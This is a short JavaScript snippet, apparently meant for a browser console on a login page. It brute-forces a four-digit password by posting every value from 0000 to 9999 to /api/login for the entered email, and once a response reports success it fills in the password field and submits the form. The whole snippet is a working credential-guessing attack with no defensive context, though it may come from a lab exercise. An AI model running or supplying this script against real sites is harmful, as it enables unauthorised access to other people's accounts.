const txtEmail = document.querySelector("#email");
const txtPassword = document.querySelector("#password");
const btnSubmit = document.querySelector(`button[type="submit"]`);

// variables
let found = false;
let index = 0;

do {
  const tryPassword = `${index.toString().padStart(4, "0")}`;

  console.log(`%cTrying ${tryPassword}`, "color: yellow");

  const response = await fetch("/api/login", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      email: txtEmail.value,
      password: tryPassword,
    }),
  });
  const result = await response.json();

  if (result.status === 202) {
    found = true;
    console.log(
      "%cSUCCESS! Password is " + tryPassword,
      "color: blue; font-size: 55px; background-color: green;"
    );

    txtPassword.value = tryPassword;
    btnSubmit.click();
  } else {
    console.log(`%c${JSON.stringify(result)}`, "color: red");
  }

  index++;
} while (found === false && index < 10000);
